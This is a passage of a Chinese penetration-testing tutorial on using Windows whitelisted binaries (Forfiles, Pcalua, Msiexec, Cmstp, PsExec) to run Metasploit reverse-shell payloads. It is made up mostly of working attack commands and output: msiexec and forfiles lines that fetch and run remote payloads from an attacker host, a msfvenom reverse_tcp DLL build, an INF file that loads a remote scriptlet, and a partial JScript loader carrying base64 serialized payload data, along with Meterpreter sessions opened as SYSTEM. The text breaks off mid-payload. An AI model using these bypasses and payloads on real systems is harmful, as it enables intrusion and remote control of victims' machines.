<pre><code class="prism language-c">PsExec<span class="token punctuation">.</span>exe <span class="token operator">-</span>d <span class="token operator">-</span>s msiexec<span class="token punctuation">.</span>exe <span class="token operator">/</span>q <span class="token operator">/</span>i <span class="token operator">&lt;</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token operator">/</span>Micropoor_rev_x86_msi_53<span class="token punctuation">.</span>txt<span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010230817391.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">11</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">131</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">20</span> <span class="token number">05</span><span class="token punctuation">:</span><span class="token number">43</span><span class="token punctuation">:</span><span class="token number">32</span> ‐<span class="token number">0500</span> 

meterpreter <span class="token operator">&gt;</span> getuid

Server username<span class="token punctuation">:</span> NT AUTHORITY\SYSTEM

meterpreter <span class="token operator">&gt;</span> getpid

Current pid<span class="token punctuation">:</span> <span class="token number">728</span>

meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010230824278.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1114_Forfilespayload_2195"></a>11.14 基于白名单Forfiles执行payload（十四）</h2>
<p><strong>Forfiles简介：</strong></p>
<p>Forfiles为Windows默认安装的文件操作搜索工具之一，可根据日期，后缀名，修改日期为条件。常与批处理配合使用。</p>
<p><strong>微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>previous<span class="token operator">-</span>versions<span class="token operator">/</span>windows<span class="token operator">/</span>it<span class="token operator">-</span>pro<span class="token operator">/</span>windows<span class="token operator">-</span>server<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">-</span>R2<span class="token operator">-</span>and<span class="token operator">-</span><span class="token number">2012</span><span class="token operator">/</span><span class="token function">cc753551</span><span class="token punctuation">(</span>v<span class="token operator">=</span>ws<span class="token punctuation">.</span><span class="token number">11</span><span class="token punctuation">)</span>
</code></pre>
<p>说明：Forfiles.exe所在路径已被系统添加PATH环境变量中，因此，Forfiles命令可识别，需注意x86，x64位的Forfiles调用。</p>
<p>Windows 2003 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\system32\forfiles<span class="token punctuation">.</span>exe 
C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\forfiles<span class="token punctuation">.</span>exe
</code></pre>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\WINDOWS\system32\forfiles<span class="token punctuation">.</span>exe 
C<span class="token punctuation">:</span>\WINDOWS\SysWOW64\forfiles<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.119 Windows 2003</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 
​
Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
​
Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 
​
Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
​
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>
​
LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
​
LPORT <span class="token number">53</span> yes The listen port 
​
Exploit target<span class="token punctuation">:</span> 
​
Id Name
 ‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 
​
msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 
​
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231159220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：Windows 2003</strong><br>
<img src="https://img-blog.csdnimg.cn/20201010231214576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">forfiles <span class="token operator">/</span>p c<span class="token punctuation">:</span>\windows\system32 <span class="token operator">/</span>m cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c <span class="token string">"msiexec.exe /q /i http://192.168.1.4/Micropoor_rev_x86_msi_53.txt"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231226682.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">15</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">133</span>
<span class="token number">1</span><span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">20</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token number">08</span> ‐<span class="token number">0500</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> WIN03X64\Administrator
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">392</span>
meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231240367.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1115_Pcaluapayload_2281"></a>11.15 基于白名单Pcalua执行payload（十五）</h2>
<p><strong>Pcalua简介：</strong></p>
<p>Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p>
<p>说明：Pcalua.exe所在路径已被系统添加PATH环境变量中，因此，Pcalua命令可识别</p>
<p>Windows 7 默认位置：</p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\pcalua<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.5 Windows 7</p>
<p><strong>配置攻击机msf：</strong></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231536710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>靶机执行：</strong></p>
<pre><code class="prism language-c">Pcalua <span class="token operator">-</span>m <span class="token operator">-</span>a \\<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>\share\rev_x86_53_exe<span class="token punctuation">.</span>exe
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231653596.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">179779</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">23</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">11349</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">20</span> <span class="token number">09</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">01</span> ‐<span class="token number">0500</span>
meterpreter <span class="token operator">&gt;</span> getuid
Server username<span class="token punctuation">:</span> John‐PC\John
meterpreter <span class="token operator">&gt;</span> getpid
Current pid<span class="token punctuation">:</span> <span class="token number">11236</span>
meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010231705736.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1116_Msiexecpayload_2353"></a>11.16 基于白名单Msiexec执行payload（八）补充</h2>
<p>本季补充本地DLL加载</p>
<p><strong>Msiexec简介：</strong></p>
<p>Msiexec是Windows Installer的一部分。用于安装Windows Installer安装包（MSI）,一般在运行Microsoft Update安装更新或安装部分软件的时候出现，占用内存比较大。并且集成于Windows 2003，Windows 7等。</p>
<p>说明：Msiexec.exe所在路径已被系统添加PATH环境变量中，因此，Msiexec命令可识别。</p>
<p><strong>基于白名单Msiexec.exe配置payload：</strong><br>
注：x64 payload</p>
<pre><code class="prism language-c">msfvenom ‐p windows<span class="token operator">/</span>x64<span class="token operator">/</span>shell<span class="token operator">/</span>reverse_tcp LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> LPORT<span class="token operator">=</span><span class="token number">53</span> ‐ f dll <span class="token operator">&gt;</span> Micropoor_rev_x64_53<span class="token punctuation">.</span>dll
</code></pre>
<p><strong>配置攻击机msf：</strong></p>
<p>注：x64 payload</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span>none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232035944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
靶机执行：</p>
<pre><code class="prism language-c">msiexec <span class="token operator">/</span>y C<span class="token punctuation">:</span>\Users\John\Desktop\Micropoor_rev_x64_dll<span class="token punctuation">.</span>dll
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232254256.png#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">206403</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">26</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">11543</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">20</span> <span class="token number">09</span><span class="token punctuation">:</span><span class="token number">45</span><span class="token punctuation">:</span><span class="token number">51</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid

Server username<span class="token punctuation">:</span> John‐PC\John

meterpreter <span class="token operator">&gt;</span> getpid

Current pid<span class="token punctuation">:</span> <span class="token number">7672</span>

meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232309608.png#pic_center" alt="在这里插入图片描述"></p>
<hr>
<h2><a id="1117_Cmstpexepayload_2431"></a>11.17 基于白名单Cmstp.exe执行payload（十六）</h2>
<p><strong>Cmstp简介：</strong></p>
<p>Cmstp安装或删除“连接管理器”服务配置文件。如果不含可选参数的情况下使用，则 cmstp 会使用对应于操作系统和用户的权限的默认设置来安装服务配置文件。</p>
<p><strong>微软官方文档：</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>docs<span class="token punctuation">.</span>microsoft<span class="token punctuation">.</span>com<span class="token operator">/</span>en<span class="token operator">-</span>us<span class="token operator">/</span>windows<span class="token operator">-</span>server<span class="token operator">/</span>administration<span class="token operator">/</span>windows<span class="token operator">-</span>commands<span class="token operator">/</span>cmstp
</code></pre>
<p>说明：Cmstp.exe所在路径已被系统添加PATH环境变量中，因此，Cmstp命令可识别，需注意x86，x64位的Cmstp调用。</p>
<p><strong>Windows 2003 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\cmstp<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\cmstp<span class="token punctuation">.</span>exe
</code></pre>
<p><strong>Windows 7 默认位置：</strong></p>
<pre><code class="prism language-c">C<span class="token punctuation">:</span>\Windows\System32\cmstp<span class="token punctuation">.</span>exe
C<span class="token punctuation">:</span>\Windows\SysWOW64\cmstp<span class="token punctuation">.</span>exe
</code></pre>
<p>攻击机： 192.168.1.4 Debian<br>
靶机： 192.168.1.119 Windows 7</p>
<p><strong>配置攻击机msf：</strong><br>
注：x64 payload</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ 

Payload options <span class="token punctuation">(</span>windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
EXITFUNC process yes Exit technique <span class="token punctuation">(</span>Accepted<span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> seh<span class="token punctuation">,</span> thread<span class="token punctuation">,</span> process<span class="token punctuation">,</span> none<span class="token punctuation">)</span>

LHOST <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span> yes The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>

LPORT <span class="token number">53</span> yes The listen port 

Exploit target<span class="token punctuation">:</span> 

Id Name
‐‐ ‐‐‐‐
<span class="token number">0</span> Wildcard Target 

emsf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232512943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>靶机执行：</strong></p>
<pre><code class="prism language-c">cmstp<span class="token punctuation">.</span>exe <span class="token operator">/</span>ni <span class="token operator">/</span>s C<span class="token punctuation">:</span>\Users\John\Desktop\rev<span class="token punctuation">.</span>inf
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232533881.png#pic_center" alt="在这里插入图片描述"><br>
注：x64 payload</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">206403</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span>

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session <span class="token number">9</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token punctuation">:</span><span class="token number">53</span> ‐<span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span><span class="token punctuation">:</span><span class="token number">13220</span><span class="token punctuation">)</span>
at <span class="token number">2019</span>‐<span class="token number">01</span>‐<span class="token number">20</span> <span class="token number">12</span><span class="token punctuation">:</span><span class="token number">08</span><span class="token punctuation">:</span><span class="token number">52</span> ‐<span class="token number">0500</span>

meterpreter <span class="token operator">&gt;</span> getuid

Server username<span class="token punctuation">:</span> John‐PC\John

meterpreter <span class="token operator">&gt;</span> getpid

Current pid<span class="token punctuation">:</span> <span class="token number">8632</span>

meterpreter <span class="token operator">&gt;</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201010232555116.png#pic_center" alt="在这里插入图片描述"></p>
<p><strong>附录：</strong><br>
Micropoor_rev_cmstp_inf：</p>
<pre><code class="prism language-c"><span class="token punctuation">[</span>version<span class="token punctuation">]</span>

Signature<span class="token operator">=</span>$chicago$

AdvancedINF<span class="token operator">=</span><span class="token number">2.5</span> 

<span class="token punctuation">[</span>DefaultInstall_SingleUser<span class="token punctuation">]</span>

UnRegisterOCXs<span class="token operator">=</span>UnRegisterOCXSection 

<span class="token punctuation">[</span>UnRegisterOCXSection<span class="token punctuation">]</span>

<span class="token operator">%</span><span class="token number">11</span><span class="token operator">%</span>\scrobj<span class="token punctuation">.</span>dll<span class="token punctuation">,</span>NI<span class="token punctuation">,</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.4</span><span class="token operator">/</span>cmstp_rev_53_x64<span class="token punctuation">.</span>sct 

<span class="token punctuation">[</span>Strings<span class="token punctuation">]</span>

AppAct <span class="token operator">=</span> <span class="token string">"SOFTWARE\Microsoft\Connection Manager"</span>

ServiceName<span class="token operator">=</span><span class="token string">"Micropoor"</span>

ShortSvcName<span class="token operator">=</span><span class="token string">"Micropoor"</span>
</code></pre>
<p>cmstp_rev_53_x64.sct</p>
<pre><code class="prism language-c"><span class="token operator">&lt;</span><span class="token operator">?</span>XML version<span class="token operator">=</span><span class="token string">"1.0"</span><span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>scriptlet<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>registration
progid<span class="token operator">=</span><span class="token string">"PoC"</span>
classid<span class="token operator">=</span><span class="token string">"{F0001111‐0000‐0000‐0000‐0000FEEDACDC}"</span> <span class="token operator">&gt;</span> 

<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"JScript"</span><span class="token operator">&gt;</span>

<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token punctuation">[</span>CDATA<span class="token punctuation">[</span> 

function <span class="token function">setversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>
function <span class="token function">debug</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
function <span class="token function">base64ToStream</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">{</span>

var enc <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Text.ASCIIEncoding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
var length <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetByteCount_2</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
var ba <span class="token operator">=</span> enc<span class="token punctuation">.</span><span class="token function">GetBytes_4</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
var transform <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.Security.Cryptography.FromBase64Transform"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ba <span class="token operator">=</span> transform<span class="token punctuation">.</span><span class="token function">TransformFinalBlock</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
var ms <span class="token operator">=</span> new <span class="token function">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"System.IO.MemoryStream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ms<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>ba<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
ms<span class="token punctuation">.</span>Position <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> ms<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

var serialized_obj <span class="token operator">=</span> "AAEAAAD<span class="token comment">/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdh</span>
dGVTZXJpYWxpemF0aW9uSG9sZGVy"<span class="token operator">+</span>
<span class="token string">"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"</span><span class="token operator">+</span>
<span class="token string">"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"</span><span class="token operator">+</span>
